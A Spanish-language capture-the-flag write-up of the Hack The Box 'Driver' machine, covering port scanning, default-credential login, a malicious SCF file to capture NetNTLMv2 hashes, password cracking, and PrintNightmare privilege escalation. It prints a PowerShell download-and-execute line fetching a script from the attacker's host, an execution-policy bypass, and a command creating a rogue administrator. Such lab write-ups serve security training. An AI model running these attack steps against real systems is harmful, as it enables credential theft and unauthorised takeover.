#  DRIVER MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/1.png)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```
nmap -p- --open -T5 - v -n 10.10.11.106 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```
nmap -p80,135,445,5985 -sV -sC 10.10.11.106 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/3.png)

## EXPLOTACION

Vemos el puerto 80 abierto, si vamos a la pagina:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/4.png)

nos pide autenticacion basica, probemos credenciales por defecto **admin:admin**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/5.png)

entramos, si vamos al apartado de **Firmware update** vemos que podemos subir archivos. Se intento archivos PHP y demas pero no se logro nada interesante. Vemos el puerto 445 (Samba) que tambien estaba abierto.

En lo que consiste explotacion al servicio samba existe una forma de obtener hashes **NetNTLMv2** mediante un fichero **SCF** malicioso, la idea es crear un archivo con el nombre que empiece con **@** y termine con la extension **.scf**:

**@shell.scf**

```bash
[Shell]
Command=2
IconFile=\\<IP_KALI>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

cargamos este archivos y nos colocamos en escucha con [responder](https://github.com/SpiderLabs/Responder):

```bash
responder -wrf --lm -v -I tun0
```

y capturamos el hash de tony

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/6.png)

lo guardamos en un archivo para crackearlo con john the ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/7.png)

vemos que tenia el puerto **5985** que es el de **winrm** vamos a conectarnos por **evil-winrm**

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/8.png)

ya podemos ver la primera flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/9.png)

## ELEVACION DE PRIVILEGIOS 

Ya que tenia el puerto **135 msrpc** abierto vamos a tratar de enumerar los servicios que estan corriendo, particularmente me interesa el de impresoras y probar el ataque **printnightmare**:

```bash
rpcdump.py @10.10.11.106 | grep MS-RPRN
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/10.png)

si se encuentra disponible, otra forma es desde powershell:

```bash
Powershell.exe Get-Service Spooler
```

vamos a usar un script en powershell de esta vulnerabilidad, se encuentra en este repositorio:

[https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)

pasamos el archivo .ps1 a la maquina windows mediante la funcion **upload** de evil-winrm:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/11.png)

ahora si tratamos de ejecutarlo nos dara el siguiente error:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/12.png)

la politica de ejecucion en powershell parece estar deshabibilitada, podemos ejecutarlo en memoria y realizar un bypass de la politica de ejecucion. En mi caso funciono la ejecucion en memoria, para ello levantamos  un servidor en python co el script y lo llamamos desde powershell de la siguiente manera:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.139:8000/CVE-2021-1675.ps1')
```

con esto cargaremos todo el script en memoria y lo podremos usar:

```bash
Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
```

como dice en el repositorio creara por defecto el usuario **john** con la contraseña **superSecure** como un usuario administrador, esto se puede personalizar pero yo lo dejare asi:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/13.png)

podemos comprobar que existe el usuario:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/14.png)

ahora solo debemos conectarnos por **evil-winrm** con ese usuario y al ser administrador podremos ver la segunda flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/DRIVER/images/15.png)

**SEGUNDO METODO PARA BYPASSAR LA POLITICA DE EJECUCION**

invocamos el script de la siguiente manera:

```bash
powershell.exe -nop -ep bypass -c ".\CVE-2021-1675.ps1"
```

ahora ya podriamos crear al usuario:

```bash
Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
```

**AQUI MAS INFORMACION DE COMO EXPLOTAR PRINTNIGHTMARE**

[https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/](https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/)